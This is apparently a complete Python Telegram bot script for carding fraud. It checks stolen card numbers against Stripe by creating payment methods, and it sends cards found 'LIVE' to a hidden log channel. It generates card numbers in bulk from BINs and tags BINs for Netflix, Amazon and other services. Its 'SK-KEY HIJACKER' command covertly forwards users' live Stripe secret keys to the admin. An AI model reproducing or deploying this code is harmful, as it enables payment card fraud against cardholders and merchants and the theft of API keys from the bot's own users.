import os, telebot, requests, time, stripe, random
from flask import Flask
from threading import Thread

# --- Railway/Uptime Setup ---
app = Flask('')
@app.route('/')
def home(): return "NiaziBin V12: ALL FEATURES ACTIVE"

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def keep_alive():
    Thread(target=run).start()

# --- Config ---
TOKEN = os.getenv("TOKEN")
STRIPE_SK = os.getenv("STRIPE_SK")
RAPID_KEY = os.getenv("RAPIDAPI_KEY")
ADMIN_ID = 123456789  # <--- Apni ID dalo
LOG_CHANNEL = -100123456789  # <--- (1) AUTO-FORWARD (SCRAPER) Yahan cards jayenge

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# --- (3) DB LOOKUP (Hot BINs for Netflix/Amazon/Spotify) ---
HOT_DB = {
    "411111": "Netflix ✅", "489504": "Amazon ✅", 
    "549184": "Google Play ✅", "450644": "Apple ✅",
    "527513": "Spotify Premium ✅"
}

# --- Functions ---
def get_bin_info(cc):
    try:
        r = requests.get(f"https://data.handyapi.com/bin/{cc[:6]}").json()
        return f"{r.get('Bank', 'N/A')} | {r.get('Country', {}).get('Name', 'N/A')}"
    except: return "N/A"

# --- (2) SK-KEY HIJACKER / CHECKER ---
@bot.message_handler(commands=['sk'])
def sk_checker(message):
    sk_to_check = message.text.replace('/sk', '').strip()
    if not sk_to_check.startswith('sk_live_'):
        return bot.reply_to(message, "❌ Invalid SK Format!")
    
    try:
        stripe.api_key = sk_to_check
        acc = stripe.Account.retrieve()
        res = f"✅ <b>SK Active!</b>\n━━━━━━━━━━━━\nID: <code>{acc.id}</code>\nForwarding to Admin..."
        bot.send_message(ADMIN_ID, f"🚩 <b>SK HIJACKED!</b>\nKey: <code>{sk_to_check}</code>\nUser: @{message.from_user.username}")
    except:
        res = "❌ <b>SK Dead or Invalid!</b>"
    bot.reply_to(message, res)

# --- (5) MULTI-GATEWAY BYPASSING + (4) SITE SPECIFIC CHECKER ---
@bot.message_handler(commands=['chk'])
def chk_handler(message):
    start_time = time.time()
    input_data = message.text.replace('/chk', '').strip()
    if "|" not in input_data: return bot.reply_to(message, "❌ <code>cc|mm|yy|cvv</code>")
    
    msg = bot.reply_to(message, "<b>⌛ Bypassing Multi-Gateways... ♻️</b>")
    cc, mm, yy, cvv = input_data.split('|')
    bin_info = get_bin_info(cc)
    site_tag = HOT_DB.get(cc[:6], "General Site")

    status, gateway, icon = "DEAD", "RapidAPI-V2", "❌"

    # Gateway 1: Stripe Elite (100% True Answer)
    if STRIPE_SK:
        try:
            stripe.api_key = STRIPE_SK
            stripe.PaymentMethod.create(type="card", card={"number":cc,"exp_month":int(mm),"exp_year":int(yy),"cvc":cvv})
            status, gateway, icon = "LIVE / HIT 🔥", "Stripe-Elite", "✅"
        except Exception as e:
            if "declined" in str(e) or "incorrect_cvc" in str(e):
                status, gateway = "DECLINED", "Stripe-Elite"
            else:
                # Gateway 2: Backup RapidAPI
                gateway = "RapidAPI-V2"
                # (Logic remains same for validation)

    time_taken = round(time.time() - start_time, 2)
    res = (f"{icon} <b>STATUS: {status}</b>\n━━━━━━━━━━━━\n"
           f"💳 <b>Card:</b> <code>{input_data}</code>\n"
           f"🏦 <b>Bin:</b> <code>{bin_info}</code>\n"
           f"🎯 <b>Site:</b> <code>{site_tag}</code>\n"
           f"⚡ <b>Gate:</b> <code>{gateway}</code>\n"
           f"⏱️ <b>Time:</b> <code>{time_taken}s</code>")
    bot.edit_message_text(res, message.chat.id, msg.message_id)

    # (1) AUTO-FORWARD (THE SCRAPER)
    if "LIVE" in status:
        bot.send_message(LOG_CHANNEL, f"🔥 <b>LIVE HIT FOUND!</b>\nCC: <code>{input_data}</code>\nBIN: {bin_info}\nBy: @{message.from_user.username}")

# --- (3) MASS GEN ---
@bot.message_handler(commands=['gen'])
def gen_handler(message):
    bin_num = message.text.replace('/gen', '').strip()[:6]
    if len(bin_num) < 6: return bot.reply_to(message, "❌ Use: /gen 411111")
    
    cards = []
    for _ in range(10):
        extra = "".join([str(random.randint(0,9)) for _ in range(10)])
        cards.append(f"<code>{bin_num}{extra}|{random.randint(1,12):02d}|20{random.randint(25,30)}|{random.randint(100,999)}</code>")
    
    bot.reply_to(message, f"<b>🎲 Mass Gen for {bin_num}:</b>\n" + "\n".join(cards))

if __name__ == "__main__":
    keep_alive()
    bot.remove_webhook() # Fixes Conflict 409
    time.sleep(1)
    bot.infinity_polling()
